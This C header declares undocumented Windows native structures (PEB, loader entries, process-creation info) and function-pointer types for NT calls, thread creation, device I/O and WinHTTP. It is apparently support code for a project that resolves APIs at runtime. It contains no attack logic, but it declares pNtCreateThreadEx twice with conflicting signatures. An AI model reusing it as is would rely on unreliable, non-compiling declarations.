#pragma once

#include <windows.h>
#include <ntstatus.h>
#include <stdbool.h>
#include <stdint.h>

#define VC_EXTRALEAN
#define WIN32_LEAN_AND_MEAN

#ifdef __cplusplus
extern "C" {
#endif

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES);        \
    (p)->RootDirectory = r;                         \
    (p)->Attributes = a;                            \
    (p)->ObjectName = n;                            \
    (p)->SecurityDescriptor = s;                    \
    (p)->SecurityQualityOfService = NULL;           \
}
  typedef struct _FILE_STANDARD_INFORMATION {
    LARGE_INTEGER AllocationSize;
    LARGE_INTEGER EndOfFile;
    ULONG NumberOfLinks;
    BOOLEAN DeletePending;
    BOOLEAN Directory;
  } FILE_STANDARD_INFORMATION, *PFILE_STANDARD_INFORMATION;

typedef struct _IO_STATUS_BLOCK {
  union {
    NTSTATUS Status;
    PVOID    Pointer;
  };
  ULONG_PTR Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef struct _FILE_DIRECTORY_INFORMATION {
  ULONG         NextEntryOffset;
  ULONG         FileIndex;
  LARGE_INTEGER CreationTime;
  LARGE_INTEGER LastAccessTime;
  LARGE_INTEGER LastWriteTime;
  LARGE_INTEGER ChangeTime;
  LARGE_INTEGER EndOfFile;
  LARGE_INTEGER AllocationSize;
  ULONG         FileAttributes;
  ULONG         FileNameLength;
  WCHAR         FileName[1];
} FILE_DIRECTORY_INFORMATION, *PFILE_DIRECTORY_INFORMATION;

typedef struct _FILE_FS_VOLUME_INFORMATION {
  LARGE_INTEGER VolumeCreationTime;
  ULONG         VolumeSerialNumber;
  ULONG         VolumeLabelLength;
  BOOLEAN       SupportsObjects;
  WCHAR         VolumeLabel[1];
} FILE_FS_VOLUME_INFORMATION, *PFILE_FS_VOLUME_INFORMATION;

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef const UNICODE_STRING *PCUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
  ULONG           Length;
  HANDLE          RootDirectory;
  PUNICODE_STRING ObjectName;
  ULONG           Attributes;
  PVOID           SecurityDescriptor;
  PVOID           SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef enum _FILE_INFORMATION_CLASS
{
    FileDirectoryInformation = 1, // q: FILE_DIRECTORY_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileFullDirectoryInformation, // q: FILE_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBothDirectoryInformation, // q: FILE_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileBasicInformation, // q; s: FILE_BASIC_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileStandardInformation, // q: FILE_STANDARD_INFORMATION, FILE_STANDARD_INFORMATION_EX
    FileInternalInformation, // q: FILE_INTERNAL_INFORMATION
    FileEaInformation, // q: FILE_EA_INFORMATION
    FileAccessInformation, // q: FILE_ACCESS_INFORMATION
    FileNameInformation, // q: FILE_NAME_INFORMATION
    FileRenameInformation, // s: FILE_RENAME_INFORMATION (requires DELETE) // 10
    FileLinkInformation, // s: FILE_LINK_INFORMATION
    FileNamesInformation, // q: FILE_NAMES_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileDispositionInformation, // s: FILE_DISPOSITION_INFORMATION (requires DELETE)
    FilePositionInformation, // q; s: FILE_POSITION_INFORMATION
    FileFullEaInformation, // FILE_FULL_EA_INFORMATION
    FileModeInformation, // q; s: FILE_MODE_INFORMATION
    FileAlignmentInformation, // q: FILE_ALIGNMENT_INFORMATION
    FileAllInformation, // q: FILE_ALL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAllocationInformation, // s: FILE_ALLOCATION_INFORMATION (requires FILE_WRITE_DATA)
    FileEndOfFileInformation, // s: FILE_END_OF_FILE_INFORMATION (requires FILE_WRITE_DATA) // 20
    FileAlternateNameInformation, // q: FILE_NAME_INFORMATION
    FileStreamInformation, // q: FILE_STREAM_INFORMATION
    FilePipeInformation, // q; s: FILE_PIPE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FilePipeLocalInformation, // q: FILE_PIPE_LOCAL_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FilePipeRemoteInformation, // q; s: FILE_PIPE_REMOTE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileMailslotQueryInformation, // q: FILE_MAILSLOT_QUERY_INFORMATION
    FileMailslotSetInformation, // s: FILE_MAILSLOT_SET_INFORMATION
    FileCompressionInformation, // q: FILE_COMPRESSION_INFORMATION
    FileObjectIdInformation, // q: FILE_OBJECTID_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileCompletionInformation, // s: FILE_COMPLETION_INFORMATION // 30
    FileMoveClusterInformation, // s: FILE_MOVE_CLUSTER_INFORMATION (requires FILE_WRITE_DATA)
    FileQuotaInformation, // q: FILE_QUOTA_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileReparsePointInformation, // q: FILE_REPARSE_POINT_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileNetworkOpenInformation, // q: FILE_NETWORK_OPEN_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileAttributeTagInformation, // q: FILE_ATTRIBUTE_TAG_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileTrackingInformation, // s: FILE_TRACKING_INFORMATION (requires FILE_WRITE_DATA)
    FileIdBothDirectoryInformation, // q: FILE_ID_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileIdFullDirectoryInformation, // q: FILE_ID_FULL_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex])
    FileValidDataLengthInformation, // s: FILE_VALID_DATA_LENGTH_INFORMATION (requires FILE_WRITE_DATA and/or SeManageVolumePrivilege)
    FileShortNameInformation, // s: FILE_NAME_INFORMATION (requires DELETE) // 40
    FileIoCompletionNotificationInformation, // q; s: FILE_IO_COMPLETION_NOTIFICATION_INFORMATION (q: requires FILE_READ_ATTRIBUTES) // since VISTA
    FileIoStatusBlockRangeInformation, // s: FILE_IOSTATUSBLOCK_RANGE_INFORMATION (requires SeLockMemoryPrivilege)
    FileIoPriorityHintInformation, // q; s: FILE_IO_PRIORITY_HINT_INFORMATION, FILE_IO_PRIORITY_HINT_INFORMATION_EX (q: requires FILE_READ_DATA)
    FileSfioReserveInformation, // q; s: FILE_SFIO_RESERVE_INFORMATION (q: requires FILE_READ_DATA)
    FileSfioVolumeInformation, // q: FILE_SFIO_VOLUME_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileHardLinkInformation, // q: FILE_LINKS_INFORMATION
    FileProcessIdsUsingFileInformation, // q: FILE_PROCESS_IDS_USING_FILE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileNormalizedNameInformation, // q: FILE_NAME_INFORMATION
    FileNetworkPhysicalNameInformation, // q: FILE_NETWORK_PHYSICAL_NAME_INFORMATION
    FileIdGlobalTxDirectoryInformation, // q: FILE_ID_GLOBAL_TX_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since WIN7 // 50
    FileIsRemoteDeviceInformation, // q: FILE_IS_REMOTE_DEVICE_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileUnusedInformation,
    FileNumaNodeInformation, // q: FILE_NUMA_NODE_INFORMATION
    FileStandardLinkInformation, // q: FILE_STANDARD_LINK_INFORMATION
    FileRemoteProtocolInformation, // q: FILE_REMOTE_PROTOCOL_INFORMATION
    FileRenameInformationBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION // since WIN8
    FileLinkInformationBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION
    FileVolumeNameInformation, // q: FILE_VOLUME_NAME_INFORMATION
    FileIdInformation, // q: FILE_ID_INFORMATION
    FileIdExtdDirectoryInformation, // q: FILE_ID_EXTD_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // 60
    FileReplaceCompletionInformation, // s: FILE_COMPLETION_INFORMATION // since WINBLUE
    FileHardLinkFullIdInformation, // q: FILE_LINK_ENTRY_FULL_ID_INFORMATION // FILE_LINKS_FULL_ID_INFORMATION
    FileIdExtdBothDirectoryInformation, // q: FILE_ID_EXTD_BOTH_DIR_INFORMATION (requires FILE_LIST_DIRECTORY) (NtQueryDirectoryFile[Ex]) // since THRESHOLD
    FileDispositionInformationEx, // s: FILE_DISPOSITION_INFO_EX (requires DELETE) // since REDSTONE
    FileRenameInformationEx, // s: FILE_RENAME_INFORMATION_EX
    FileRenameInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_RENAME_INFORMATION_EX
    FileDesiredStorageClassInformation, // q; s: FILE_DESIRED_STORAGE_CLASS_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since REDSTONE2
    FileStatInformation, // q: FILE_STAT_INFORMATION (requires FILE_READ_ATTRIBUTES)
    FileMemoryPartitionInformation, // s: FILE_MEMORY_PARTITION_INFORMATION // since REDSTONE3
    FileStatLxInformation, // q: FILE_STAT_LX_INFORMATION (requires FILE_READ_ATTRIBUTES and FILE_READ_EA) // since REDSTONE4 // 70
    FileCaseSensitiveInformation, // q; s: FILE_CASE_SENSITIVE_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileLinkInformationEx, // s: FILE_LINK_INFORMATION_EX // since REDSTONE5
    FileLinkInformationExBypassAccessCheck, // (kernel-mode only); s: FILE_LINK_INFORMATION_EX
    FileStorageReserveIdInformation, // q; s: FILE_STORAGE_RESERVE_ID_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES)
    FileCaseSensitiveInformationForceAccessCheck, // q; s: FILE_CASE_SENSITIVE_INFORMATION
    FileKnownFolderInformation, // q; s: FILE_KNOWN_FOLDER_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES) // since WIN11
    FileStatBasicInformation, // since 23H2
    FileId64ExtdDirectoryInformation, // FILE_ID_64_EXTD_DIR_INFORMATION
    FileId64ExtdBothDirectoryInformation, // FILE_ID_64_EXTD_BOTH_DIR_INFORMATION
    FileIdAllExtdDirectoryInformation, // FILE_ID_ALL_EXTD_DIR_INFORMATION
    FileIdAllExtdBothDirectoryInformation, // FILE_ID_ALL_EXTD_BOTH_DIR_INFORMATION
    FileStreamReservationInformation, // FILE_STREAM_RESERVATION_INFORMATION // since 24H2
    FileMupProviderInfo, // MUP_PROVIDER_INFORMATION
    FileMaximumInformation
} FILE_INFORMATION_CLASS, *PFILE_INFORMATION_CLASS;

typedef enum _FSINFOCLASS
{
    FileFsVolumeInformation = 1, // q: FILE_FS_VOLUME_INFORMATION
    FileFsLabelInformation, // s: FILE_FS_LABEL_INFORMATION (requires FILE_WRITE_DATA to volume)
    FileFsSizeInformation, // q: FILE_FS_SIZE_INFORMATION
    FileFsDeviceInformation, // q: FILE_FS_DEVICE_INFORMATION
    FileFsAttributeInformation, // q: FILE_FS_ATTRIBUTE_INFORMATION
    FileFsControlInformation, // q, s: FILE_FS_CONTROL_INFORMATION  (q: requires FILE_READ_DATA; s: requires FILE_WRITE_DATA to volume)
    FileFsFullSizeInformation, // q: FILE_FS_FULL_SIZE_INFORMATION
    FileFsObjectIdInformation, // q; s: FILE_FS_OBJECTID_INFORMATION (s: requires FILE_WRITE_DATA to volume)
    FileFsDriverPathInformation, // q: FILE_FS_DRIVER_PATH_INFORMATION
    FileFsVolumeFlagsInformation, // q; s: FILE_FS_VOLUME_FLAGS_INFORMATION (q: requires FILE_READ_ATTRIBUTES; s: requires FILE_WRITE_ATTRIBUTES to volume) // 10
    FileFsSectorSizeInformation, // q: FILE_FS_SECTOR_SIZE_INFORMATION // since WIN8
    FileFsDataCopyInformation, // q: FILE_FS_DATA_COPY_INFORMATION
    FileFsMetadataSizeInformation, // q: FILE_FS_METADATA_SIZE_INFORMATION // since THRESHOLD
    FileFsFullSizeInformationEx, // q: FILE_FS_FULL_SIZE_INFORMATION_EX // since REDSTONE5
    FileFsGuidInformation, // q: FILE_FS_GUID_INFORMATION // since 23H2
    FileFsMaximumInformation
} FSINFOCLASS, *PFSINFOCLASS;


typedef struct _FILE_POSITION_INFORMATION
{
    LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, *PFILE_POSITION_INFORMATION;


typedef struct _FILE_END_OF_FILE_INFORMATION
{
    LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, *PFILE_END_OF_FILE_INFORMATION;

typedef struct _PEB_LDR_DATA {
    ULONG                   Length;
    BOOLEAN                 Initialized;
    PVOID                   SsHandle;
    LIST_ENTRY              InLoadOrderModuleList;
    LIST_ENTRY              InMemoryOrderModuleList;
    LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _RTL_DRIVE_LETTER_CURDIR {
    USHORT                  Flags;
    USHORT                  Length;
    ULONG                   TimeStamp;
    UNICODE_STRING          DosPath;
} RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
    ULONG                   MaximumLength;
    ULONG                   Length;
    ULONG                   Flags;
    ULONG                   DebugFlags;
    PVOID                   ConsoleHandle;
    ULONG                   ConsoleFlags;
    HANDLE                  StdInputHandle;
    HANDLE                  StdOutputHandle;
    HANDLE                  StdErrorHandle;
    UNICODE_STRING          CurrentDirectoryPath;
    HANDLE                  CurrentDirectoryHandle;
    UNICODE_STRING          DllPath;
    UNICODE_STRING          ImagePathName;
    UNICODE_STRING          CommandLine;
    PVOID                   Environment;
    ULONG                   StartingPositionLeft;
    ULONG                   StartingPositionTop;
    ULONG                   Width;
    ULONG                   Height;
    ULONG                   CharWidth;
    ULONG                   CharHeight;
    ULONG                   ConsoleTextAttributes;
    ULONG                   WindowFlags;
    ULONG                   ShowWindowFlags;
    UNICODE_STRING          WindowTitle;
    UNICODE_STRING          DesktopName;
    UNICODE_STRING          ShellInfo;
    UNICODE_STRING          RuntimeData;
    RTL_DRIVE_LETTER_CURDIR DLCurrentDirectory[0x20];
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

typedef void (*PPEBLOCKROUTINE)(
        PVOID PebLock
);

typedef PVOID* PPVOID;

typedef struct _PEB_FREE_BLOCK {
    struct _PEB_FREE_BLOCK  *Next;
    ULONG                   Size;
} PEB_FREE_BLOCK, *PPEB_FREE_BLOCK;

typedef struct _PEB {
    BOOLEAN                 InheritedAddressSpace;
    BOOLEAN                 ReadImageFileExecOptions;
    BOOLEAN                 BeingDebugged;
    BOOLEAN                 Spare;
    HANDLE                  Mutant;
    PVOID                   ImageBaseAddress;
    PPEB_LDR_DATA           LoaderData;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID                   SubSystemData;
    PVOID                   ProcessHeap;
    PVOID                   FastPebLock;
    PPEBLOCKROUTINE         FastPebLockRoutine;
    PPEBLOCKROUTINE         FastPebUnlockRoutine;
    ULONG                   EnvironmentUpdateCount;
    PPVOID                  KernelCallbackTable;
    PVOID                   EventLogSection;
    PVOID                   EventLog;
    PPEB_FREE_BLOCK         FreeList;
    ULONG                   TlsExpansionCounter;
    PVOID                   TlsBitmap;
    ULONG                   TlsBitmapBits[0x2];
    PVOID                   ReadOnlySharedMemoryBase;
    PVOID                   ReadOnlySharedMemoryHeap;
    PPVOID                  ReadOnlyStaticServerData;
    PVOID                   AnsiCodePageData;
    PVOID                   OemCodePageData;
    PVOID                   UnicodeCaseTableData;
    ULONG                   NumberOfProcessors;
    ULONG                   NtGlobalFlag;
    BYTE                    Spare2[0x4];
    LARGE_INTEGER           CriticalSectionTimeout;
    ULONG                   HeapSegmentReserve;
    ULONG                   HeapSegmentCommit;
    ULONG                   HeapDeCommitTotalFreeThreshold;
    ULONG                   HeapDeCommitFreeBlockThreshold;
    ULONG                   NumberOfHeaps;
    ULONG                   MaximumNumberOfHeaps;
    PPVOID                  *ProcessHeaps;
    PVOID                   GdiSharedHandleTable;
    PVOID                   ProcessStarterHelper;
    PVOID                   GdiDCAttributeList;
    PVOID                   LoaderLock;
    ULONG                   OSMajorVersion;
    ULONG                   OSMinorVersion;
    ULONG                   OSBuildNumber;
    ULONG                   OSPlatformId;
    ULONG                   ImageSubSystem;
    ULONG                   ImageSubSystemMajorVersion;
    ULONG                   ImageSubSystemMinorVersion;
    ULONG                   GdiHandleBuffer[0x22];
    ULONG                   PostProcessInitRoutine;
    ULONG                   TlsExpansionBitmap;
    BYTE                    TlsExpansionBitmapBits[0x80];
    ULONG                   SessionId;
} PEB, *PPEB;

typedef struct _LDR_DATA_TABLE_ENTRY
{
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    WORD LoadCount;
    WORD TlsIndex;
    union
    {
        LIST_ENTRY HashLinks;
        struct
        {
            PVOID SectionPointer;
            ULONG CheckSum;
        };
    };
    union
    {
        ULONG TimeDateStamp;
        PVOID LoadedImports;
    };
    PVOID Reserved;
    PVOID PatchInformation;
    LIST_ENTRY ForwarderLinks;
    LIST_ENTRY ServiceTagLinks;
    LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;


#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)


typedef VOID (NTAPI *PIO_APC_ROUTINE)(
    _In_ PVOID ApcContext,
    _In_ PIO_STATUS_BLOCK IoStatusBlock,
    _In_ ULONG Reserved
    );

typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;

typedef enum _PS_CREATE_STATE
{
    PsCreateInitialState,
    PsCreateFailOnFileOpen,
    PsCreateFailOnSectionCreate,
    PsCreateFailExeFormat,
    PsCreateFailMachineMismatch,
    PsCreateFailExeName, // Debugger specified
    PsCreateSuccess,
    PsCreateMaximumStates
} PS_CREATE_STATE;


typedef struct _FILE_BOTH_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    _Field_size_bytes_(FileNameLength) WCHAR FileName[1];
} FILE_BOTH_DIR_INFORMATION, *P_FILE_BOTH_DIR_INFORMATION;

typedef struct _PS_ATTRIBUTE
{
    ULONG_PTR Attribute;
    SIZE_T Size;
    union
    {
        ULONG_PTR Value;
        PVOID ValuePtr;
    };
    PSIZE_T ReturnLength;
} PS_ATTRIBUTE, *PPS_ATTRIBUTE;

typedef struct _PS_CREATE_INFO
{
    SIZE_T Size;
    PS_CREATE_STATE State;
    union
    {
        // PsCreateInitialState
        struct
        {
            union
            {
                ULONG InitFlags;
                struct
                {
                    UCHAR WriteOutputOnExit : 1;
                    UCHAR DetectManifest : 1;
                    UCHAR IFEOSkipDebugger : 1;
                    UCHAR IFEODoNotPropagateKeyState : 1;
                    UCHAR SpareBits1 : 4;
                    UCHAR SpareBits2 : 8;
                    USHORT ProhibitedImageCharacteristics : 16;
                };
            };
            ACCESS_MASK AdditionalFileAccess;
        } InitState;

        // PsCreateFailOnSectionCreate
        struct
        {
            HANDLE FileHandle;
        } FailSection;

        // PsCreateFailExeFormat
        struct
        {
            USHORT DllCharacteristics;
        } ExeFormat;

        // PsCreateFailExeName
        struct
        {
            HANDLE IFEOKey;
        } ExeName;

        // PsCreateSuccess
        struct
        {
            union
            {
                ULONG OutputFlags;
                struct
                {
                    UCHAR ProtectedProcess : 1;
                    UCHAR AddressSpaceOverride : 1;
                    UCHAR DevOverrideEnabled : 1; // from Image File Execution Options
                    UCHAR ManifestDetected : 1;
                    UCHAR ProtectedProcessLight : 1;
                    UCHAR SpareBits1 : 3;
                    UCHAR SpareBits2 : 8;
                    USHORT SpareBits3 : 16;
                };
            };
            HANDLE FileHandle;
            HANDLE SectionHandle;
            ULONGLONG UserProcessParametersNative;
            ULONG UserProcessParametersWow64;
            ULONG CurrentParameterFlags;
            ULONGLONG PebAddressNative;
            ULONG PebAddressWow64;
            ULONGLONG ManifestAddress;
            ULONG ManifestSize;
        } SuccessState;
    };
} PS_CREATE_INFO, *PPS_CREATE_INFO;


typedef enum _SECTION_INHERIT
{
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT;



typedef struct _FILE_FULL_DIR_INFORMATION
{
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    _Field_size_bytes_(FileNameLength) WCHAR FileName[1];
} FILE_FULL_DIR_INFORMATION, *PFILE_FULL_DIR_INFORMATION;

typedef struct _PS_ATTRIBUTE_LIST
{
    SIZE_T TotalLength;
    PS_ATTRIBUTE Attributes[1];
} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;

#define DIRECTORY_QUERY 0x0001
#define DIRECTORY_TRAVERSE 0x0002
#define DIRECTORY_CREATE_OBJECT 0x0004
#define DIRECTORY_CREATE_SUBDIRECTORY 0x0008
#define DIRECTORY_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | DIRECTORY_QUERY | DIRECTORY_TRAVERSE | DIRECTORY_CREATE_OBJECT | DIRECTORY_CREATE_SUBDIRECTORY)

typedef NTSTATUS (NTAPI *pRtlCreateProcessParametersEx)(
        PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
        PUNICODE_STRING ImagePathName,
        PUNICODE_STRING DllPath,
        PUNICODE_STRING CurrentDirectory,
        PUNICODE_STRING CommandLine,
        PVOID Environment,
        PUNICODE_STRING WindowTitle,
        PUNICODE_STRING DesktopName,
        PUNICODE_STRING ShellInfo,
        PUNICODE_STRING RuntimeData,
        ULONG Flags // pass RTL_USER_PROC_PARAMS_NORMALIZED to keep parameters normalized
    );

typedef VOID (NTAPI * pRtlCaptureContext)(PCONTEXT ContextRecord);

typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);
typedef NTSTATUS (NTAPI *pNtCreateFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, ULONG_PTR, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS (NTAPI *pNtTerminateThread)(HANDLE, NTSTATUS);
typedef NTSTATUS (NTAPI *pNtQueryDirectoryFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS, BOOLEAN, PUNICODE_STRING, BOOLEAN);
typedef NTSTATUS (NTAPI *pNtQueryVolumeInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FSINFOCLASS);
typedef NTSTATUS (NTAPI *pNtQueryInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef NTSTATUS (NTAPI *pNtReadFile)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID, PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);
typedef NTSTATUS (NTAPI *pNtSetInformationFile)(HANDLE, PIO_STATUS_BLOCK, PVOID, ULONG, FILE_INFORMATION_CLASS);
typedef NTSTATUS (NTAPI *pNtOpenFile)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE, BOOLEAN, PLARGE_INTEGER);


typedef int (NTAPI *pDeviceIoControl)(HANDLE hDevice, DWORD dwIoControlCode, LPVOID lpInBuffer, DWORD nInBufferSize, LPVOID lpOutBuffer, DWORD nOutBufferSize, LPDWORD lpBytesReturned, LPOVERLAPPED lpOverlapped);

typedef NTSTATUS(NTAPI *pNtDeviceIoControlFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PIO_APC_ROUTINE ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    ULONG IoControlCode,
    PVOID InputBuffer,
    ULONG InputBufferLength,
    PVOID OutputBuffer,
    ULONG OutputBufferLength
);

typedef struct _PROCESS_DEVICEMAP_INFORMATION
{
    union
    {
        struct
        {
            HANDLE DirectoryHandle; // A handle to a directory object that can be set as the new device map for the process. This handle must have DIRECTORY_TRAVERSE access.
        } Set;
        struct
        {
            ULONG DriveMap;         // A bitmask that indicates which drive letters are currently in use in the process's device map.
            UCHAR DriveType[32];    // A value that indicates the type of each drive (e.g., local disk, network drive, etc.). // DRIVE_* WinBase.h
        } Query;
    };
} PROCESS_DEVICEMAP_INFORMATION, *PPROCESS_DEVICEMAP_INFORMATION;

typedef struct addrinfo {
  int             ai_flags;
  int             ai_family;
  int             ai_socktype;
  int             ai_protocol;
  size_t          ai_addrlen;
  char            *ai_canonname;
  struct sockaddr *ai_addr;
  struct addrinfo *ai_next;
} ADDRINFOA, *PADDRINFOA;

typedef enum _PROCESSINFOCLASS {
    ProcessBasicInformation,
    ProcessQuotaLimits,
    ProcessIoCounters,
    ProcessVmCounters,
    ProcessTimes,
    ProcessBasePriority,
    ProcessRaisePriority,
    ProcessDebugPort,
    ProcessExceptionPort,
    ProcessAccessToken,
    ProcessLdtInformation,
    ProcessLdtSize,
    ProcessDefaultHardErrorMode,
    ProcessIoPortHandlers,
    ProcessPooledUsageAndLimits,
    ProcessWorkingSetWatch,
    ProcessUserModeIOPL,
    ProcessEnableAlignmentFaultFixup,
    ProcessPriorityClass,
    ProcessWx86Information,
    ProcessHandleCount,
    ProcessAffinityMask,
    ProcessPriorityBoost,
    ProcessDeviceMap,
    ProcessSessionInformation,
    ProcessForegroundInformation,
    ProcessWow64Information,
    ProcessImageFileName,
    ProcessLUIDDeviceMapsEnabled,
    ProcessBreakOnTermination,
    ProcessDebugObjectHandle,
    ProcessDebugFlags,
    ProcessHandleTracing,
    ProcessIoPriority,
    ProcessExecuteFlags,
    ProcessTlsInformation,
    ProcessCookie,
    ProcessImageInformation,
    ProcessCycleTime,
    ProcessPagePriority,
    ProcessInstrumentationCallback,
    ProcessThreadStackAllocation,
    ProcessWorkingSetWatchEx,
    ProcessImageFileNameWin32,
    ProcessImageFileMapping,
    ProcessAffinityUpdateMode,
    ProcessMemoryAllocationMode,
    ProcessGroupInformation,
    ProcessTokenVirtualizationEnabled,
    ProcessConsoleHostProcess,
    ProcessWindowInformation,
    MaxProcessInfoClass
    } PROCESSINFOCLASS;
#define CSIDL_APPDATA 0x001A
#define FILE_SHARE_NONE 0
#define NT_SUCCESS(Status)  (((NTSTATUS)(Status)) >= 0)
#define RTL_USER_PROC_PARAMS_NORMALIZED                 0x00000001
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_KERNEL_HANDLE                   0x00000200L
typedef HMODULE (WINAPI *LOADLIBRARYA)(LPCSTR lpLibFileName);
typedef LPVOID HINTERNET;
typedef WORD INTERNET_PORT;
#define INTERNET_DEFAULT_PORT           0
#define INTERNET_DEFAULT_HTTP_PORT      80
#define INTERNET_DEFAULT_HTTPS_PORT     443
#define WINHTTP_FLAG_ASYNC                  0x10000000

/* flags for WinHttpOpenRequest */
#define WINHTTP_FLAG_ESCAPE_PERCENT         0x00000004
#define WINHTTP_FLAG_NULL_CODEPAGE          0x00000008
#define WINHTTP_FLAG_ESCAPE_DISABLE         0x00000040
#define WINHTTP_FLAG_ESCAPE_DISABLE_QUERY   0x00000080
#define WINHTTP_FLAG_BYPASS_PROXY_CACHE     0x00000100
#define WINHTTP_FLAG_REFRESH                WINHTTP_FLAG_BYPASS_PROXY_CACHE
#define WINHTTP_FLAG_SECURE                 0x00800000

#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY   0
#define WINHTTP_ACCESS_TYPE_NO_PROXY        1
#define WINHTTP_ACCESS_TYPE_NAMED_PROXY     3
#define WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY 4

